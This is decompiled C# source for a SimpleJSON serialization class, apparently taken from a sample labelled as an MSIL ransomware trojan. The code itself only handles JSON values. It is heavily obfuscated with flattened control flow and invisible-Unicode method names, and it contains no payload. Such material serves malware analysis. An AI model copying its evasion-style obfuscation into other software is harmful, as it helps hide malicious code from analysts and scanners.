// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONData
// Assembly: ModuleBuild, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 89F10113-88CA-4804-9B17-4A5288FD99D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2e269df5f1ed94bc3f07c434a6d33a1e48ce04fd0feb953bba71e2a8ced82875.exe

using System.IO;
using System.Runtime.InteropServices;

namespace SimpleJSON
{
  public class JSONData : JSONNode
  {
    private string m_Data;

    public override string Value
    {
      get
      {
label_1:
        int num1 = 407274332;
        string data;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 453309873)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              data = this.m_Data;
              num1 = (int) num2 * 339131552 ^ 1800814489;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return data;
      }
      set => this.m_Data = value;
    }

    public JSONData(string aData) => this.m_Data = aData;

    public JSONData(float aData)
    {
label_1:
      int num1 = 944431285;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1045049584)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1723639544 ^ -1939572964;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 9931269 ^ 1303940191;
            continue;
          case 4:
            this.AsFloat = aData;
            num1 = (int) num2 * 1958638867 ^ -551813424;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public JSONData(double aData)
    {
label_1:
      int num1 = 1339887257;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1899675876)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.AsDouble = aData;
            num1 = (int) num2 * -768523392 ^ 1644185407;
            continue;
          case 2:
            num1 = (int) num2 * 197934735 ^ 261159801;
            continue;
          case 3:
            goto label_3;
          case 4:
            num1 = (int) num2 * 1153825089 ^ -460495613;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public JSONData(bool aData)
    {
label_1:
      int num1 = 969807863;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 480819601)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1200050529 ^ -1277495801;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      this.AsBool = aData;
    }

    public JSONData(int aData) => this.AsInt = aData;

    public override string ToString()
    {
      string str = JSONData.\u206D‭‍⁯‪‫‭‪⁪​⁭‍‭‏⁮‏‍‭⁬‮⁫⁪‬⁯‪⁪⁯‍⁮‮‎‎‪⁯⁭⁫⁫‍‍‌‮("\"", JSONNode.Escape(this.m_Data), "\"");
label_1:
      int num1 = 1521759356;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1244503920)) % 3U)
        {
          case 1:
            num1 = (int) num2 * 1727548179 ^ -1009444564;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override string ToString(string aPrefix)
    {
      string str = JSONData.\u206D‭‍⁯‪‫‭‪⁪​⁭‍‭‏⁮‏‍‭⁬‮⁫⁪‬⁯‪⁪⁯‍⁮‮‎‎‪⁯⁭⁫⁫‍‍‌‮("\"", JSONNode.Escape(this.m_Data), "\"");
label_1:
      int num1 = -1139391802;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -468662559)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1532308401 ^ 434091356;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    public override void Serialize(BinaryWriter aWriter)
    {
      JSONData jsonData = new JSONData("");
label_1:
      int num1 = 630764711;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1362275762)) % 34U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1603918966 ^ 1952690755;
            continue;
          case 2:
            JSONData.\u200F⁫‪‭⁯‭‭⁯⁬⁭​⁮⁮⁭‏⁯‭‍⁭‫⁭⁮‏‮⁬⁯‍⁬‍⁬‏‫‭‏‫⁮‪‏​‍‮(aWriter, (byte) 5);
            JSONData.\u202D​⁮⁫‮⁫⁫⁫‏‍⁭⁪⁯‏‭‍‍⁭‭⁬‏⁭⁪⁭‫‭‌‭‪​‎‮​⁯‍‍‌⁬⁮⁬‮(aWriter, this.AsDouble);
            num1 = (int) num2 * 1162427374 ^ 1062743597;
            continue;
          case 3:
            JSONData.\u200F⁫‪‭⁯‭‭⁯⁬⁭​⁮⁮⁭‏⁯‭‍⁭‫⁭⁮‏‮⁬⁯‍⁬‍⁬‏‫‭‏‫⁮‪‏​‍‮(aWriter, (byte) 6);
            num1 = (int) num2 * -91780863 ^ -2032960009;
            continue;
          case 4:
            num1 = (int) num2 * -922901203 ^ 498460353;
            continue;
          case 5:
            int num3 = !JSONData.\u206C‮‬⁭⁪⁯‌‮⁪⁭‍‌‌‬‌‪‮‍⁪‮⁫‪⁪​‎​⁪⁬‎‭‎⁫‫⁮‌‭⁭⁫‌‫‮(jsonData.m_Data, this.m_Data) ? -117868489 : (num3 = -225522157);
            num1 = num3 ^ (int) num2 * 248140041;
            continue;
          case 6:
            num1 = (int) num2 * -657269416 ^ 959863815;
            continue;
          case 7:
            JSONData.\u200F⁫‪‭⁯‭‭⁯⁬⁭​⁮⁮⁭‏⁯‭‍⁭‫⁭⁮‏‮⁬⁯‍⁬‍⁬‏‫‭‏‫⁮‪‏​‍‮(aWriter, (byte) 7);
            num1 = (int) num2 * -700049903 ^ 996811053;
            continue;
          case 8:
            JSONData.\u202E‭⁮‬‭‫‎⁯‭‎‍⁮​⁮‏‍‭⁬⁮⁪⁭‮​⁯‏​⁯‪⁪⁭‍‍⁪⁪‏‎‫‌⁯‭‮(aWriter, this.m_Data);
            num1 = (int) num2 * 782255712 ^ -1484911203;
            continue;
          case 9:
            jsonData.AsInt = this.AsInt;
            num1 = (int) num2 * 1724763069 ^ 2147450256;
            continue;
          case 10:
            num1 = (int) num2 * -1454472871 ^ -268062407;
            continue;
          case 11:
            num1 = (int) num2 * 880539882 ^ -1101247444;
            continue;
          case 12:
            int num4 = !flag2 ? -1159650927 : (num4 = -743800654);
            num1 = num4 ^ (int) num2 * 309337988;
            continue;
          case 13:
            JSONData.\u200F⁫‪‭⁯‭‭⁯⁬⁭​⁮⁮⁭‏⁯‭‍⁭‫⁭⁮‏‮⁬⁯‍⁬‍⁬‏‫‭‏‫⁮‪‏​‍‮(aWriter, (byte) 3);
            num1 = 508604705;
            continue;
          case 14:
            num1 = (int) num2 * 1157956872 ^ -967926019;
            continue;
          case 15:
            num1 = (int) num2 * 2129959439 ^ 2129635930;
            continue;
          case 16:
            num1 = (int) num2 * -1690789839 ^ -2000590279;
            continue;
          case 17:
            JSONData.\u202A‏⁪‏⁭‍⁭⁭‫‌‏⁯‏⁯⁫‫⁭‬​‎‏‎⁯‮⁬⁮⁫‪⁭⁬​‮⁯‫‭‭‮‎‏⁯‮(aWriter, this.AsFloat);
            num1 = (int) num2 * -1381049851 ^ 1487625681;
            continue;
          case 18:
            num1 = (int) num2 * -1093531200 ^ -395547235;
            continue;
          case 19:
            goto label_3;
          case 20:
            JSONData.\u206B‎⁫⁫⁫⁭⁮‭‮⁪‭⁫‮⁬⁭⁯‬⁪‫‍‍‭⁪‪⁪‎‍‮‫‏‌‏‌⁪‪‎‎‏‫‮‮(aWriter, this.AsBool);
            num1 = (int) num2 * 326288002 ^ -1693292698;
            continue;
          case 21:
            JSONData.\u200F⁫‪‭⁯‭‭⁯⁬⁭​⁮⁮⁭‏⁯‭‍⁭‫⁭⁮‏‮⁬⁯‍⁬‍⁬‏‫‭‏‫⁮‪‏​‍‮(aWriter, (byte) 4);
            num1 = (int) num2 * 1667481475 ^ -884602161;
            continue;
          case 22:
            num1 = (int) num2 * 1437450653 ^ 23555939;
            continue;
          case 23:
            int num5 = !JSONData.\u206C‮‬⁭⁪⁯‌‮⁪⁭‍‌‌‬‌‪‮‍⁪‮⁫‪⁪​‎​⁪⁬‎‭‎⁫‫⁮‌‭⁭⁫‌‫‮(jsonData.m_Data, this.m_Data) ? -294987586 : (num5 = -1117361779);
            num1 = num5 ^ (int) num2 * 877352803;
            continue;
          case 24:
            jsonData.AsDouble = this.AsDouble;
            num1 = 695082095;
            continue;
          case 25:
            int num6 = !flag1 ? -374638372 : (num6 = -569134828);
            num1 = num6 ^ (int) num2 * -1186681916;
            continue;
          case 26:
            jsonData.AsBool = this.AsBool;
            num1 = 999983586;
            continue;
          case 27:
            flag2 = JSONData.\u206C‮‬⁭⁪⁯‌‮⁪⁭‍‌‌‬‌‪‮‍⁪‮⁫‪⁪​‎​⁪⁬‎‭‎⁫‫⁮‌‭⁭⁫‌‫‮(jsonData.m_Data, this.m_Data);
            num1 = (int) num2 * 1021887302 ^ -1947842154;
            continue;
          case 28:
            num1 = (int) num2 * 1303510298 ^ 273293177;
            continue;
          case 29:
            num1 = (int) num2 * -387874504 ^ 1968879906;
            continue;
          case 30:
            num1 = (int) num2 * -321035936 ^ -563486632;
            continue;
          case 31:
            flag1 = JSONData.\u206C‮‬⁭⁪⁯‌‮⁪⁭‍‌‌‬‌‪‮‍⁪‮⁫‪⁪​‎​⁪⁬‎‭‎⁫‫⁮‌‭⁭⁫‌‫‮(jsonData.m_Data, this.m_Data);
            num1 = (int) num2 * 705748902 ^ 570117693;
            continue;
          case 32:
            JSONData.\u206E​‮‬​‏⁯‌‍⁬‌‎‫‮‭⁬⁬​​‌‎‮‪⁫‪⁯⁮‪‏⁯‫​⁮‭​‍⁮⁮⁭⁭‮(aWriter, this.AsInt);
            num1 = (int) num2 * -1379204778 ^ 644161035;
            continue;
          case 33:
            jsonData.AsFloat = this.AsFloat;
            num1 = 1753875701;
            continue;
          default:
            goto label_36;
        }
      }
label_3:
      return;
label_36:;
    }

    static string \u206D‭‍⁯‪‫‭‪⁪​⁭‍‭‏⁮‏‍‭⁬‮⁫⁪‬⁯‪⁪⁯‍⁮‮‎‎‪⁯⁭⁫⁫‍‍‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static bool \u206C‮‬⁭⁪⁯‌‮⁪⁭‍‌‌‬‌‪‮‍⁪‮⁫‪⁪​‎​⁪⁬‎‭‎⁫‫⁮‌‭⁭⁫‌‫‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static void \u200F⁫‪‭⁯‭‭⁯⁬⁭​⁮⁮⁭‏⁯‭‍⁭‫⁭⁮‏‮⁬⁯‍⁬‍⁬‏‫‭‏‫⁮‪‏​‍‮([In] BinaryWriter obj0, [In] byte obj1) => obj0.Write(obj1);

    static void \u206E​‮‬​‏⁯‌‍⁬‌‎‫‮‭⁬⁬​​‌‎‮‪⁫‪⁯⁮‪‏⁯‫​⁮‭​‍⁮⁮⁭⁭‮([In] BinaryWriter obj0, [In] int obj1) => obj0.Write(obj1);

    static void \u202A‏⁪‏⁭‍⁭⁭‫‌‏⁯‏⁯⁫‫⁭‬​‎‏‎⁯‮⁬⁮⁫‪⁭⁬​‮⁯‫‭‭‮‎‏⁯‮([In] BinaryWriter obj0, [In] float obj1) => obj0.Write(obj1);

    static void \u202D​⁮⁫‮⁫⁫⁫‏‍⁭⁪⁯‏‭‍‍⁭‭⁬‏⁭⁪⁭‫‭‌‭‪​‎‮​⁯‍‍‌⁬⁮⁬‮([In] BinaryWriter obj0, [In] double obj1) => obj0.Write(obj1);

    static void \u206B‎⁫⁫⁫⁭⁮‭‮⁪‭⁫‮⁬⁭⁯‬⁪‫‍‍‭⁪‪⁪‎‍‮‫‏‌‏‌⁪‪‎‎‏‫‮‮([In] BinaryWriter obj0, [In] bool obj1) => obj0.Write(obj1);

    static void \u202E‭⁮‬‭‫‎⁯‭‎‍⁮​⁮‏‍‭⁬⁮⁪⁭‮​⁯‏​⁯‪⁪⁭‍‍⁪⁪‏‎‫‌⁯‭‮([In] BinaryWriter obj0, [In] string obj1) => obj0.Write(obj1);
  }
}
